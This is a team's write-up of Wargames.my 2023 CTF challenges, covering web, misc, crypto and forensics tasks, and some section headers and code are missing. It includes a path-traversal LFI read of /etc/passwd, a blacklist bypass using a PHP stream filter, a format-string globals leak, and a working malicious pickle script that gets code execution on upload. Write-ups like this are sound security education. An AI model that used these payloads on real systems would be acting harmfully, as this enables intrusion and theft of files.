# Wargames.my 2023 - Writeup
A year had passed since my [last participation](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2022.md) in wgmyCTF so this is my fourth wgmyCTF all time, and the second time in student category.
The quality of challenge improved a lot this year. With just right difficulties and almost no guessy challenges, it was a well organised CTF.

I am going by the team of `GPT-110` this time, with old and new friends. Our team changed a bit but we're still fourth place :). It was a good experience nevertheless.
Many of the challenges are multi-stage, with rabbit holes waiting to trap us players. I'd say they're quite tricky but I guess it was a chance for me to learn to be patient, as many times I took a few hours just to solve a challenge.

#### Getting the Password
To get the password, we can first set a breakpoint on the `onclick` handler of the button. Tracing the call down to an object referenced in an if statement reveals the correct password it's comparing to.<br>
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/b442bd47-638c-4037-a730-66fe18d4c90e)

Password: `this_password_is_so_weak_i_can_crack_in_1_sec!`

#### Discovering LFI
After entering the correct password, a success alert box is shown with a text that reads `Here's your flag`. Upon closer inspection, we can see that the text is read from a web API `api/4aa22934982f984b8a0438b701e8dec8.php?x=flag_for_warmup.php`.<br>
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/4249a452-c9b1-4d0f-99a8-ed56b6e87505)<br>
Since changing the `x` parameter to `../../../etc/passwd` reveals the passwd file, we can confirm this is a LFI vulnerability.

#### Exploitation
The text hints that the flag is likely hidden within the comment of the php file, so we need to find a way to read the php source code. Based on experience, php supports [many kinds of stream filters](https://www.php.net/manual/en/filters.php) that can tamper with input file before they're returned to the reader. <br>
Several basic attempts showed that the most common filters are blocked by a word blacklist. With multiple trial and error, it's found that the `zlib.defalte` filter is not blocked. So we employ it to modify our file stream and get the php file back in zlib compressed form.<br>
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/5102cf09-8b32-45cc-9702-95d72311e739)<br>
After we got it, we can run a php instance to decode it using the `zlib_decode` function, and get the flag.

We are presented with a webpage that reads data from XML and render them in a [jinja2 template](https://flask.palletsprojects.com/en/2.3.x/templating/) with [Flask](https://flask.palletsprojects.com/).<br>
Obviously the first thing we would try is some [XXE techniques](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) but since [`defusedxml`](https://pypi.org/project/defusedxml/) by default [forbid entities declaration](https://github.com/tiran/defusedxml#:~:text=instruction%20is%20found.-,forbid_entities,-(default%3A%20True)), an exception will be thrown. [Template injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) is also not possible because `render_template` is only called on static html file.

After many hours of frustration, finally I notice that in line 55, the data string is concatenated with user input (`image_path`) before it is used with `str.format` function to format. Double substitution in this order creates an interesting vulnerability named [format string vulnerability](https://security.stackexchange.com/a/239661/235815).<br>
To exploit this, we can simply substitute `image_path` with `{0.__init__.__globals__}` to get all global variables which also contain the flag.

#### Discovery
Playing around with the site we can notice that it'll perform a directory listing when we change directory. Through this feature, we can find out that the flag is located at `/flag.txt` and the site is running on `/app/app.py`.<br>

By changing the root directory to `/app` we can read the source code of `app.py` through the load dataset feature.

</details>
Through the code, we can see that there is a hidden `/upload` endpoint that allows us to upload a file to the server, even though the frontend doesn't show it. There is also a list of banned words to prevent us from directly reading the flag.

#### Analysis
An obvious exploitation vector here would be [pickle insecure deserialisation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md) from line 101 where pickle is explicitly allowed. To feed a malicious file to it, we can utilise the upload endpoint which allows us to save any file as long as the filename ends with `.csv`. This works because `np.load` doesn't check for file extension when loading from file as it read directly from an I/O stream.

#### Exploitation
When unserialising a pickle, the `__reduce__` function is automatically called, then its return value is called again with its first member as the function and the second as its arguments, and this is how a RCE can occur. Knowing this, we construct our malicious pickle file as follows which copy the flag file into another name that's not blacklisted:
<details>
<summary>Script to make a malicious pickle file</summary>

```py
import pickle

class PickleRCE(object):
    def __reduce__(self):
        return (exec, ("""exec('import shutil;shutil.copyfile("/flag.txt", "/app/uploads/wgmy.txt")')""",))

with open("pick.csv", "wb") as f:
    pickle.dump(PickleRCE(), f)
```
</details>

After uploading the file to the server with `curl -F "dataset=@pick.csv" http://13.229.150.169:33776/uploads`, we use the directory listing feature to check the name of our uploaded file and load it with load model feature. Upon loading, our code should execute and flag file will be copied to `/app/uploads/wgmy.txt`.<br>
To read the flag, we can just change to appropriate root directory and load the renamed flag file as model.<br>

## Misc
### Warmup - Game
> It's cold, we need to warmup

[*Back to top*](#table-of-contents)


#### Unpack
We are provided with a simple game made using Unity game engine (as evidenced by the logo and the splash).<br>
Unity executables usually come with dll and asset files, but we only have one executable file this time. To answer this, we load the executable in dnSpy, which revealed that a [packer](https://github.com/SerGreen/Appacker) is involved.<br>
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/5dbac3ca-60ca-4598-9e17-d4b5e69c7483)<br>
To proceed, we set a breakpoint on the unpack function to find out where it unpacks (somewhere random in `%TEMP%` folder) and copy all the unpacked files out.

#### Reverse
Now that we have all the normal Unity files, customarily we inspect them using a Unity asset extraction tool such as [UABEA](https://github.com/nesrak1/UABEA).<br>
Most of the important game assets are in the `data.unity3d` file. Within the `level0` scene, there's a GameObject named `TrueRoom` which is suspicious enough.
Viewing the only text `GameObject` inside reveals the flag in base64 format. <br>

### Sayur
> Sayur Kemudian Lebih Latih

*Solved post contest*<br>
[*Back to top*](#table-of-contents)

This time we only got a png image, analysing the image through [stegsolve](http://www.caesum.com/handbook/Stegsolve.jar) reveals that there's data encoded within plane 0 and 1 of each colour channel. This hints that the image could be LSB 2-bit encoded.
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/91db788a-f8d3-4b35-94bf-75b2d9db93b1)

Running [`zsteg`](https://github.com/zed-0xff/zsteg) through the image reveals there's valid text data when arranging the bits by row in rgba order. We use `zsteg sayur.png -E b2,rgba,lsb,xy > extracted.txt` to extract all the text out.<br>
Lastly through trial and error, we produce a script to decode the text by transforming the signature phrase 菜就多练 in various language into base 4 bits, and finally obtain the flag after 3 rounds.

<details>
<summary>Solution script for Sayur</summary>

```py
from Crypto.Util.number import long_to_bytes

with open("extracted.txt", 'r', encoding='utf-8') as f:
    bits = f.read()

bits = bits.replace('Sayur', '0').replace('Kemudian', '1').replace("Banyak", '2').replace("Latih", '3')
bits = long_to_bytes(int(bits, 4)).decode().replace('Vegetable', '0').replace('Then', '1').replace("Many", '2').replace("Practice", '3')
bits = long_to_bytes(int(bits, 4)).decode().replace('菜', '0').replace('就', '1').replace("多", '2').replace("练", '3')

We are given a RSA with totient `phi` replacing the usual modulus `n`. Since `p` and `q` are prime, and that `phi = (p - 1)(q - 1)`, `phi` can be easily factorised due to its large number of factors (both `p - 1` and `q - 1` are composite). Another observation we can make is a certain combination of the totient's factors will be either `p - 1` or `q - 1`.

Therefore we employ this strategy:
1. Factorise the totient `phi`.
2. For each unique combination of the totient's factors, get their `product + 1`.<br>
   If it is prime, assume `p` and use `phi / (p - 1) + 1` to find `q`. Then we attempt to decrypt with the found primes. If known flag format is seen, we get the correct primes and the flag.

#### Analysis
Inspecting the zip file contents only reveals 2 potentially interesting file, which is `Desktop/flag.png` and `AppData/Local/Microsoft/Terminal Server Client/Cache/Cache0000.bin`. The `flag.png` is actually a zip fle encrypting `flag.txt` using ZipCrypto Store. Usually a zip file like this is vulnerable to the [Biham & Kocher's PKZIP known plaintext attack](https://link.springer.com/content/pdf/10.1007/3-540-60590-8_12.pdf) but it needs at least 8 continuous known bytes to work, which we don't have. Diving in more further to this would be a rabbit hole.

Turning to `Cache0000.bin`, `file` couldn't identify its file type and we see a lot of repeated bytes throughout.<br>
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/ec2eebbc-293b-4393-90db-5f7c21ca4872)<br>
At first glance it looks useless but if we search the filename, we can find [articles like this](https://www.linkedin.com/pulse/blind-forensics-rdp-bitmap-cache-ronald-craft/) which explains that it is a RDP bitmap cahce file.<br>
Now this is something promising.

#### Extraction
To extract the images from the cache, we ran a [script](https://github.com/Viralmaniar/Remote-Desktop-Caching-/blob/master/rdpcache.ps1) found online. It gives us a lot of files but there's a few interesting ones towards the end.<br>
![image](https://github.com/rixinsc/ctf-writeups/assets/37703689/1035e9b7-3b1e-42bd-b093-e1f331abeb32)<br>
We squeeze our eyes hard on these images for a while and we get our password: `WGMY_P4ssw0rd_N0t_V3ry_H4rd!!!`. Then we can proceed to just normally unzip the flag archive with our newly acquired password.

### Linux Memory Usage

*Solved by [teammmate](https://github.com/yayadontknow)*<br>
[*Back to top*](#table-of-contents)

To solve this problem, we need to build a tree-like structure representing the relationships between processes and their parents. Then, for each query, calculate the total memory usage of the specified process and all its descendants.

<details>
<summary>First attempt</summary>

```py
from collections import defaultdict

def calculate_memory_usage(process_id, process_tree, process_memory):
    total_memory = process_memory[process_id]

    for child_id in process_tree[process_id]:
        total_memory += calculate_memory_usage(child_id, process_tree, process_memory)

    return total_memory

def main():
    # Input reading
    N, Q = map(int, input().split())
    process_tree = defaultdict(list)
    process_memory = {}

    for _ in range(N):
        pid, ppid, mem = map(int, input().split())
        process_tree[ppid].append(pid)
        process_memory[pid] = mem

    # Process queries
    for _ in range(Q):
        query_pid = int(input())
        total_memory = calculate_memory_usage(query_pid, process_tree, process_memory)
        print(total_memory)

if __name__ == "__main__":
    main()
```
</details>

But time limit exceeds!

Since it did not set limit according to language, so I optimize the program by storing the total memory usage for each process during the tree traversal and avoiding redundant calculations and rewrite it using C++

<details>
<summary>Final attempt</summary>

```cpp
#include <iostream>
#include <vector>
#include <unordered_map>

using namespace std;

unordered_map<int, vector<int>> process_tree;
unordered_map<int, int> process_memory;
unordered_map<int, int> memo;

int calculate_memory_usage(int process_id) {
    if (memo.find(process_id) != memo.end()) {
        return memo[process_id];
    }

    int total_memory = process_memory[process_id];

    for (int child_id : process_tree[process_id]) {
        total_memory += calculate_memory_usage(child_id);
    }

    memo[process_id] = total_memory;
    return total_memory;
}

int main() {
    // Input reading
    int N, Q;
    cin >> N >> Q;

    for (int i = 0; i < N; ++i) {
        int pid, ppid, mem;
        cin >> pid >> ppid >> mem;
        process_tree[ppid].push_back(pid);
        process_memory[pid] = mem;
    }

    // Process queries
    for (int i = 0; i < Q; ++i) {
        int query_pid;
        cin >> query_pid;
        int total_memory = calculate_memory_usage(query_pid);
        cout << total_memory << endl;
    }

    return 0;
}
```
</details>

Then, we did it!
